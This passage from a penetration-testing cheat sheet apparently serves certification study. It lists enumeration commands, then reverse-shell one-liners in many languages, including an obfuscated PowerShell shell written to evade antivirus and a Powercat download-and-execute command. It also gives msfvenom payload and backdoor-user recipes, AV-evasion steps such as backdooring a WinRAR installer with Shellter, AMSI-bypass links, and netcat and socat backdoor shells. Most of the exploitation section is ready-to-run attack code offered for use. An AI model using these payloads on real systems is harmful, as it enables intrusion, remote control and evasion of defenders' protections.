        ```
        ```
        auxiliary/scanner/snmp/snmp_login
        ```

        <br></br>
    </details>

    <details>
    <summary>Onesixtyone</summary>

    + 
        <br></br>

        ```
        onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i ip_list
        ```

        <li><b>-c</b>&ensp;--&ensp;Communities</li>
        <li><b>-i</b>&ensp;--&ensp;IP List</li>
        <br></br>
    </details>

    <details>
    <summary>SNMP-Check</summary>

    + 
        <br></br>

        ```
        snmp-check x.x.x.x -c public
        ```

        <li><b>-c</b>&ensp;--&ensp;</li>
        <br></br>
    </details>

    <details>
    <summary>Impacket</summary>

    + 
        <br></br>

        ```
        python3 samdump.py SNMP x.x.x.x
        ```

        <br></br>
    </details>
</details>

<details>
<summary>FTP</summary>

+ <details>
    <summary>FTP</summary>

    + 
        <br></br>
        <b>Connect Via Terminal</b>

        ```
        ftp x.x.x.x
        ```

        <br></br>
        <b>Connect Via Browser</b>

        ```
        ftp://x.x.x.x 21
        ```
        
        <b>Anonymous Login Credentials username and pass</b>
        
        ```
        anonymous
        ```
        
        <b>Passive Mode Toggle</b>
        
        ```
        passive
        ```
        
        <b>Binary Mode</b>
        
        ```
        binary
        ```
        
        <b>Upload File</b>
        
        ```
        put evil.exe evil.exe
        ```

        <br></br>
    </details>

    <details>
    <summary>Nmap Enumeration</summary>

    + 
        <br></br>

        ```
        nmap x.x.x.x -p 21 -sV --script=exampleScript1.nse,exampleScript2.exe
        ```

        <li><b>-p</b>&ensp;--&ensp;Scan Ports Entered</li>
        <li><b>-sV</b>&ensp;--&ensp;Version Scanning</li>
        <li><b>--script</b>&ensp;--&ensp;Script Scan using the comma-separated list of filenames</li>
        <br></br>

        <br></br>
        <b>FTP Scripts</b>

        ```
        /usr/share/nmap/scripts/ftp-anon.nse
        ```
        ```
        /usr/share/nmap/scripts/ftp-bounce.nse
        ```
        ```
        /usr/share/nmap/scripts/ftp-brute.nse
        ```
        ```
        /usr/share/nmap/scripts/ftp-libopie.nse
        ```
        ```
        /usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
        ```
        ```
        /usr/share/nmap/scripts/ftp-syst.nse
        ```
        ```
        /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
        ```
        ```
        /usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
        ```
        ```
        /usr/share/nmap/scripts/tftp-enum.nse
        ```

    </details>
</details>

<br></br>
<H1>What are some Exploitation Techniques?</H1>

<details>
<summary>General Notes</summary>

+ <details>
    <summary>Pre-requisites for Running Exploits</summary>

    + 
        <li><b>1. Check the version of the operating system.</b></li>
        <li><b>2. Check the software version.</b></li>
        <li><b>3. Check if there is exploit for it (Searchsploit, ExploitDB, Google, etc).</b></li>
        <li><b>4. If you have an exploit, is there a Metasploit Module for it?</b></li>
        <br></br>
    </details>
    <details>
    <summary>Fixing Exploits</summary>
    
    +
        <br></br>
        <b>Cross Compiling Exploit Code</b>
        
        ```
        sudo apt install mingw-w64
        ```
        ```
        i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
        ```
        ```
        i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
        ```
        ```
        wine syncbreeze_exploit.exe
        ```
        
        <li>Change IP's and Ports to your specific target</li>
        <li>Check Return address, bad characters and payload on buffer overflow exploits</li>
       
    
    </details>
    <details>
    <summary>Default Credentials</summary>

    + 
        <br></br>

        ```
        https://cirt.net/passwords
        ```
        ```
        https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
        ```

        <br></br>
    </details>

    <details>
    <summary>Reverse Shells</summary>

    + 
        <br></br>
        <b>Bash</b>

        ```
        bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1
        ```
        
        <br></br>
        <b>Powercat Reverse Shell</b>
        
        ```
        powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/powercat.ps1');powercat -c x.x.x.x -p 4444 -e cmd
        ```

        <br></br>
        <b>Perl</b>

        ```
        perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        ```

        <br></br>
        <b>Python</b>

        ```
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        ```

        <br></br>
        <b>IPv6</b>

        ```
        python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
        ```

        <br></br>
        <b>Ruby</b>

        ```
        ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
        ```
        ```
        ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
        ```

        <br></br>
        <b>PHP</b>

        ```
        php -r '$sock=fsockopen("IP ADDRESS",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
        ```
        ```
        /usr/share/webshells/php/php-reverse-shell.php
        ```
        ```
        http://pentestmonkey.net/tools/web-shells/php-reverse-shell
        ```

        <br></br>
        <b>Windows Powershell Oneliner:</b> Replace IP Address with number values in Check.for.Callback.Connection. To change the port pick your own numeric values to equal the number you want your shell to callback to you.

        ```
        # Offsec-callback-v2
        $ezYSZf = & ((Get-Command "New-ScheduledJobOption").name[0,1,2,3,14,15,13,1,5,18] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})("Check.for.Callback.Connection".Replace("Check",127).Replace("For",0+255-255).Replace("Callback", 0+234-234).Replace("Connection",0+0+0+1),(443*2-443));
        $VXm = $ezYSZf.GetStream();
        # checkin to target
        [byte[]]$0bLXRjHKPvWQUhq = (10023-10023)..(13107*5)|<##>%{$_}<##>|%{0};
        while(($i = $VXm.Read($0bLXRjHKPvWQUhq, 0, $0bLXRjHKPvWQUhq.Length)) -ne 0)
        {;
        $Tc9dYRLI5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($0bLXRjHKPvWQUhq,0, $i);
        $sendback = (iex $Tc9dYRLI5 2>&1 |<##>%{$_}<##>| Out-String );
        # AND
        $YzlnHIRT = $sendback + $(([string]::join('', ( (80,83,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})) + (pwd).Path + $(([string]::join('', ( (62,62,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}));
        $sdfghjklASDA222 = ([text.encoding]::ASCII).GetBytes($YzlnHIRT);
        $VXm.Write($sdfghjklASDA222,0,$sdfghjklASDA222.Length);$VXm.Flush()
        };
        Start-Sleep -Seconds 5
        # checkout of target
        $ezYSZf.Close()
        ```

        <br></br>
        <b>Linux Powershell Oneliner:</b>

        ```
        $ezYSZf = & (("New-ScheduledJobOption")[0,1,2,3,14,15,13,1,5,18] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})("Stay.Off.Ronins.Lawn".Replace("Stay",127).Replace("Off",0+255-255).Replace("Ronins", 0+1-1).Replace("Lawn",0+0+0+1),(443*2-443));
        $VXm = $ezYSZf.GetStream();
        [byte[]]$0bLXRjHKPvWQUhq = (10023-10023)..(13107*5)|<##>%{$_}<##>|%{0};
        while(($i = $VXm.Read($0bLXRjHKPvWQUhq, 0, $0bLXRjHKPvWQUhq.Length)) -ne 0)
        {;
        $Tc9dYRLI5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($0bLXRjHKPvWQUhq,0, $i);
        $sendback = (iex $Tc9dYRLI5 2>&1 |<##>%{$_}<##>| Out-String );
        $YzlnHIRT = $sendback + $(([string]::join('', ( (80,83,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_})) + (pwd).Path + $(([string]::join('', ( (62,62,32) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}));
        $sdfghjklASDA222 = ([text.encoding]::ASCII).GetBytes($YzlnHIRT);
        $VXm.Write($sdfghjklASDA222,0,$sdfghjklASDA222.Length);$VXm.Flush()
        };
        $ezYSZf.Close()
        ```

        <br></br>
        <b>Golang</b>

        ```
        echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
        ```

        <br></br>
        <b>AWK</b>

        ```
        awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
        ```

        <br></br>
        <b>Other Shells</b>

        ```
        https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md
        ```

        <br></br>
        <b>Other Resources</b>

        ```
        Amsi-Bypass-Powershell: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
        ```

        <br></br>
    </details>
</details>

<details>
<summary>File Permission Exploitations</summary>

+
    <br></br>
    <b>Need Specific UUID? (permissions to edit passwd and create user needed) Example: NFS Share mounted on Host with UUID 1014</b>

    ```
    sudo adduser USER && sudo sed -i -e 's/1001/1014/g' /etc/passwd && su USER
    ```

    <li><b>-i</b>&ensp;--&ensp;Replace file in place</li>
    <li><b>-e</b>&ensp;--&ensp;Execute Script</li>
    <br></br>
</details>


<details>
<summary>Bypassing AV</summary>

+ <details>
    <summary>Veil Framework</summary>

    + 
        <br></br>
        <b>Install on Kali</b>

        ```
        apt install veil
        ```
        ```
        /usr/share/veil/config/setup.sh --force --silent  
        ```
        ```
        veil -t Evasion -p 7 --msfvenom windows/meterpreter/reverse_tcp --ip x.x.x.x --port 4444 -o veil.bat
        ```
        ```
        msfconsole -x "use exploit/multi/handler; set RHOST x.x.x.x; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST x.x.x.x; set AutoRunScript post/windows/manage/migrate; exploit"
        ```
        ```
        ```

        <b>Reference</b>
        ```
        https://github.com/Veil-Framework/Veil
        ```

        <br></br>
    </details>

    <details>
    <summary>Shellter</summary>

    + 
        <br></br>
        <b>Source</b>

        ```
        https://www.shellterproject.com/download/
        ```

        <b>Install on Kali</b>

        ```
        sudo apt install shellter
        ```
        ```
        sudo shellter
        ```
        ```
        Choose Operation Mode - Auto/Manual (A/M/H): A
        ```
        ```
        https://www.rarlab.com/download.htm
        ```
        ```
        Download WinRAR x86 (32 bit) 6.11
        ```
        ```
        cp /home/kali/Downloads/winrar-x32-611.exe wrar611.exe
        ```
        ```
        PE Target: /home/kali/wrar611.exe
        ```
        ```
        Enable Stealth Mode? (Y/N/H): Y
        ```
        ```
        Use a listed payload or custom? (L/C/H): L
        ```
        ```
        Select payload by index: 1
        ```
        ```
        SET LHOST: x.x.x.x
        ```
        ```
        SET LPORT: 4444
        ```
        ```
        msfconsole -x "use exploit/multi/handler; set RHOST x.x.x.x; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST x.x.x.x; set AutoRunScript post/windows/manage/migrate; exploit"
        ```
        
        <b>windows cmd</b>
        
        ```
        C:\Tools\practical_tools\nc.exe -nvlp 4455 > C:\Users\offsec\Desktop\wrar611.exe
        ```
        
        <b>linux Terminal</b>
        
        ```
        nc -w 3 x.x.x.x 4455 < wrar611.exe
        ```
        
        <b>Windows Machine</b>
        
        ```
        Run wrar611.exe
        ```
        
        <b>Linux Meterpreter Session</b>
        
        ```
        shell
        ```
        
        <br></br>
    </details>

    <details>
    <summary>Sharpshooter</summary>

    + 
        <br></br>
        <b>Javascript Payload Stageless</b>

        ```
        SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
        ```

        <b>Stageless HTA Payload:</b>

        ```
        SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
        ```

        <b>Staged VBS</b>

        ```
        SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
        ```

        <b>Reference</b>

        ```
        https://github.com/mdsecactivebreach/SharpShooter
        ```

        <br></br>
    </details>

    <details>
    <summary>Donut</summary>

    + 
        <br></br>
        <b>Source</b>

        ```
        https://github.com/TheWover/donut
        ```

        <br></br>
    </details>

    <details>
    <summary>Vulcan</summary>

    + 
        <br></br>
        <b>Source</b>

        ```
        https://github.com/praetorian-code/vulcan
        ```

        <br></br>
    </details>

    <details>
    <summary>Scarecrow</summary>

    + 
        <br></br>
        <b>Source</b>

        ```
        https://github.com/optiv/ScareCrow
        ```

        <br></br>
        <b>Install/Run on Kali</b>

        ```
        sudo apt install golang
        ```
        ```
        go get github.com/fatih/color
        ```
        ```
        go get github.com/yeka/zip
        ```
        ```
        go get github.com/josephspurrier/goversioninfo
        ```
        ```
        go build ScareCrow.go
        ```
        ```
        ./ScareCrow
        ```

        <br></br>
    </details>
</details>

<details>
<summary>SearchSploit</summary>

+ 
    <br></br>
    <b>Installing (Already in Kali)</b> 

    ```
    apt update && apt install exploitdb
    ```

    <b>Install binsploits</b>
    <br>Note: bin-sploits contains a set of compiled binaries that are tied to exploits in the exploitdb database. Installing this package will take some time depending on your network connection.<br>

    ```
    apt update && apt install exploitdb-bin-sploits
    ```

    <b>Update SearchSploit</b>

    ```
    searchsploit -u
    ```

    <b>Basic Search</b>

    ```
    searchsploit <version #> etc
    ```
    ```
    searchsploit -t php windows
    ```

    <b>Exclude Unwanted Results</b>

    ```
    searchsploit linux kernel 5.2 --exclude="Poc"
    ```

    <b>View exploits from Searchsploit</b>

    ```
    searchsploit 9542 --examine
    ```
    ```
    searchsploit -x window/remote/42031.py
    ```

    <b>Copy exploit to current working directory</b>

    ```
    searchsploit -m
    ```

    <b>Access Exploits from Exploit-DB website</b>

    ```
    searchsploit vsftpd 2.3.4 -w
    ```

    <b>Run an nmap scan result through searchsploit</b>

    ```
    Nmap -Pn 172.21.0.0 -oX results.xml
    ```
    ```
    searchsploit -x --nmap results.xml
    ```

    <b>References</b>

    ```
    https://www.exploit-db.com/documentation/Offsec-SearchSploit.pdf
    ```

    <br></br>
</details>

<details>
<summary>Msfvenom</summary>

+ 
    <br></br>
    <b>List Payloads</b>

    ```
    msfvenom -l payloads
    ```

    <b>View Payload Options</b>

    ```
    msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options
    ```

    <b>Creating a Payload</b>

    ```
    msfvenom -p [payload] LHOST=[listeninghost] LPORT=[listeningport]
    ```

    <b>Creating a payload with encoding</b>

    ```
    msfvenom -p [payload] -e [encoder] -f [formattype] -i [iteration] <var=value> > outputfile
    ```

    <b>Creating a payload using a template</b>

    ```
    msfvenom -p [payload] <var=value> -x [template] -f [formattype] > outputfile
    ```

    <b>Listening for MSfvenom Payloads (from msframework)</b>

    ```
    use exploit/multi/handler
    ```
    ```  
    set payload windows/meterpreter/reverse_tcp  
    ```
    ```
    set lhost <IP>  
    ```
    ```
    set lport <PORT>
    ```
    ```
    set ExitOnSession false
    ```
    ```
    exploit -j
    ```

    <b>Windows Payloads</b>
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LORT=4444 -f hta-psh -o shell.hta
    ```

    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
    ```
    ```
    msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
    ```
    ```
    msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
    ```
    ```
    msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
    ```
    ```
    msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
    ```

    <b> Add a user in windows with msfvenom</b>

    ```
    msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
    ```

    <b>Linux Payloads</b>

    ```
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
    ```
    ```
    msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
    ```
    ```
    msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
    ```
    ```
    msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
    ```

    <b>Web Payloads: PHP</b>

    ```
    msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
    ```
    ```
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
    ```

    <b>Web Payloads: ASP</b>

    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
    ```

    <b>Web Payloads: JSP</b>

    ```
    msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
    ```

    <b>Web Payloads: WAR</b>

    ```
    msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT=  shell.war
    ```

    <b>Scripting Payloads: Python</b>

    ```
    msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
    ```

    <b>Scripting Payloads: Bash</b>

    ```
    msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
    ```

    <b>Scripting Payloads: Perl</b>

    ```
    msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
    ```

    <b>Creating an Msfvenom Payload with an encoder while removing bad characters</b>

    ```
    msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
    ```

    <b>Resources</b>

    ```
    https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/
    ```

    <br></br>
</details>

<details>
<summary>Bypass Windows Amsi</summary>

+ 
    <br></br>
    <b>Testing for Amsi Bypass</b>

    ```
    https://github.com/rasta-mouse/AmsiScanBufferBypass
    ```

    <b>Amsi-Bypass-Powershell</b>

    ```
    https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
    ```

    <b>Resources</b>

    ```
    https://blog.f-secure.com/hunting-for-amsi-bypasses/
    ```
    ```
    https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
    ```
    ```
    https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
    ```
    ```
    https://slaeryan.github.io/posts/falcon-zero-alpha.html
    ```

    <br></br>
</details>

<details>
<summary>Netcat Tips</summary>

+ 
    <br></br>
    <b>Connect to Netcat Client</b>

    ```
    rlwrap nc -nv x.x.x.x 4444
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
    <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>

    <br></br>
    <b>Connect to netcat Listener</b>

    ```
    rlwrap nc -nlvp 4444
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
    <li><b>-l</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
    <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
    <li><b>-p</b>&ensp;--&ensp;Port Number</li>
    <br></br>

    <b>Transfer Files</b>

    ```
    rlwrap nc -nlvp 4444 > incoming.exe
    ```
    ```
    rlwrap nc -nv x.x.x.x 4444 < /Downloads/maliciousfile.exe
    ```

    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
    <li><b>-l</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
    <li><b>-n</b>&ensp;--&ensp;Skip DNS Name Resolution</li>
    <li><b>-v</b>&ensp;--&ensp;Verbose Output</li>
    <br></br>

    <b>Backdoor Shells: Linux</b>

    ```
    rlwrap nc x.x.x.x -e /bin/sh
    ```
    ```
    rlwrap nc x.x.x.x -e /bin/bash
    ```
    ```
    rlwrap nc x.x.x.x -e /bin/zsh
    ```
    ```
    rlwrap nc x.x.x.x -e /bin/ash
    ```

    <li><b>-e</b>&ensp;--&ensp;Binds Port to Application</li>
    <br></br>

    <b>Backdoor Shells: Windows</b>

    ```
    rlwrap nc -lv 4444 -e cmd.ex
    ```

    <li><b>-e</b>&ensp;--&ensp;Binds Port to Application</li>
    <br></br>

    <b>Linux netcat reverse shell</b>

    ```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 4444 >/tmp/f
    ```

    <br></br>
</details> 

<details>
<summary>Socat Tips</summary>

+ 
    <br></br>
    <b>Connect to Socat Client</b>

    ```
    rlwrap socat - TCP4:x.x.x.x:4444
    ```

    <li><b>-</b>&ensp;--&ensp;Transfer Data</li>
    <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>

    <br></br>

    <b>Connect to Encrypted Client</b>

    ```
     rlwrap socat - OPENSSL:x.x.x.x:4444,verify=0

    ```

    <li><b>-</b>&ensp;--&ensp;Transfer Data</li>
    <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
    <li><b>verify=0</b>&ensp;--&ensp;Disable SSL Verification</li>

    <br></br>
    <br></br>

    <b>Connect to Socat Listener</b>

    ```
    rlwrap sudo socat -d -d TCP4-LISTEN:4444 STDOUT
    ```

    <li><b>-d</b>&ensp;--&ensp;Verbose Output</li>
    <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
    <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
    <li><b>STDOUT</b>&ensp;--&ensp;</li>

    <br></br>
    <br></br>

    <b>Transfer Files</b>

    ```
    rlwrap sudo socat TCP4-LISTEN:4444,fork file:secret_passwords.txt
    ```
    ```
    rlwrap socat TCP4:x.x.x.x:4444 file:received_secret_passwords.txt,create
    ```

    <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
    <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
    <li><b>fork</b>&ensp;--&ensp;Spawn Child Process After Connection</li>
    <li><b>file</b>&ensp;--&ensp;Add File Name to be Generated</li>
    <li><b>create</b>&ensp;--&ensp;</li>

    <br></br>

    <b>Backdoor Shells: Linux</b>

    ```
    rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/sh
    ```
    ```
    rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/bash
    ```
    ```
    rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/zsh
    ```
    ```
    rlwrap socat TCP4:x.x.x.x:4444 EXEC:/bin/ash
    ```

    <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
    <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>

    <br></br>

    <b>Backdoor Shells: Windows</b>

    ```
    rlwrap socat TCP4:x.x.x.x:4444 EXEC:'cmd.exe',pipes
    ```

    <li><b>TCP4</b>&ensp;--&ensp;Use IPv4 Protocol</li>
    <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>
    <li><b>pipes</b>&ensp;--&ensp;</li>

    <br></br>

    <b>Socat Encrypted Bind Shells: OpenSSL Create Self-Signed Certificate</b>

    ```
    openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
    ```

    <li><b>req&ensp;-x509</b>&ensp;--&ensp;Creates Self-Signed Certificates</li>
    <li><b>-newkey</b>&ensp;--&ensp;Generate New Private Key</li>
    <li><b>rsa:2048</b>&ensp;--&ensp;Specify RSA Encryption with 2048 Key length</li>
    <li><b>-nodes</b>&ensp;--&ensp;Store Private Key Unecrypted</li>
    <li><b>-keyout</b>&ensp;--&ensp;Saves Private Key to File</li>
    <li><b>-days</b>&ensp;--&ensp;Validity Period in Days</li>
    <li><b>-out</b>&ensp;--&ensp;Saves Certificate to File</li>

    <br></br>
    <br></br>

    <b>Socat Encrypted Bind Shells: Convert .key & .cert into .pem</b>

    ```
    cat bind_shell.key bind_shell.crt > bind_shell.pem
    ```

    <b>Socat Encrypted Bind Shells: Create Encrypted Socat Listener on Linux Machine</b>

    ```
    rlwrap sudo socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
    ```

    <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
    <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
    <li><b>cert</b>&ensp;--&ensp;Specifies Certificate File</li>
    <li><b>verify=0</b>&ensp;--&ensp;Disables SSL Verification</li>
    <li><b>fork</b>&ensp;--&ensp;Spawns Child Process After Connection</li>
    <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>

    <br></br>
    <br></br>

    <b>Socat Encrypted Bind Shells: Connect Computer to Bind Shell</b>

    ```
    rlwrap socat - OPENSSL:x.x.x.x:4444,verify=0
    ```

    <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
    <li><b>verify=0</b>&ensp;--&ensp;Disables SSL Verification</li>

    <br></br>
    <b>Socat Encrypted Bind Shells: Send CMD terminal</b>

    ```
    rlwrap sudo socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork STDOUT
    ```
    ```
    socat OPENSSL:x.x.x.x:4444,verify=0 EXEC:'cmd.exe',pipes
    ```

    <li><b>OPENSSL</b>&ensp;--&ensp;Use Encrypted Protocol</li>
    <li><b>-LISTEN</b>&ensp;--&ensp;Listen Mode, for Inbound Connects</li>
    <li><b>cert</b>&ensp;--&ensp;Specifies Certificate File</li>
    <li><b>verify=0</b>&ensp;--&ensp;Disables SSL Verification</li>
    <li><b>fork</b>&ensp;--&ensp;Spawns Child Process After Connection</li>
    <li><b>STDOUT</b>&ensp;--&ensp;</li>
    <li><b>EXEC:</b>&ensp;--&ensp;Execute this Application</li>
    <li><b>pipes</b>&ensp;--&ensp;</li>

    <br></br>
</details> 

<details>
<summary>PowerShell Tips</summary>

+ 
  <br></br>
    <b>Change Execution Policy: Unrestricted</b>

    ```
    Set-ExecutionPolicy Unrestricted
    ```

    <br></br>
    <b>Check Current Execution Policy</b>

    ```
    Get-ExecutionPolicy
    ```


    <br></br>
    
    <b>Run Powershell as administrator in Powershell</b>
    
    ```
    start-process powershell -verb runas
    ```
    
    <br></br>
    <b>Connect to  Client</b>

    ```
    nc -nv x.x.x.x 4444
    ```

    <br></br>

    <b>Bind Shell : PowerShell</b>

    ```
    powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
    ```

    <li><b>-c</b>&ensp;--&ensp;Executes Command Between " " as Powershell Prompt</li>
    <li><b>New-Object System.Net.Sockets.TcpListener</b>&ensp;--&ensp;Requires 2 Arguments: Listening IP and Port</li>
    <li><b>$sendback = (iex $data 2>&1 | Out-String )</b>&ensp;--&ensp;Executes Command</li>
    <br></br>
    <br></br>

    <b>Transfer Files: PowerShell</b>

    ```
    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/powercat.ps1','C:\Users\USER_NAME\Desktop\powercat.ps1')"
    ```

    <li><b>(-c)</b>&ensp;--&ensp;Executes Command Between " " as Powershell Prompt</li>
    <li><b>(new-object System.Net.WebClient)</b>&ensp;--&ensp;Instantiate either a .Net Framework or COM object</li>
    <li><b>(DownloadFile)</b>&ensp;--&ensp;Public Method of Webclient. Requires Source Location and Target Location </li>
    <br></br>

    <b>Reverse Shells: PowerShell</b>

    ```
    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('x.x.x.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```

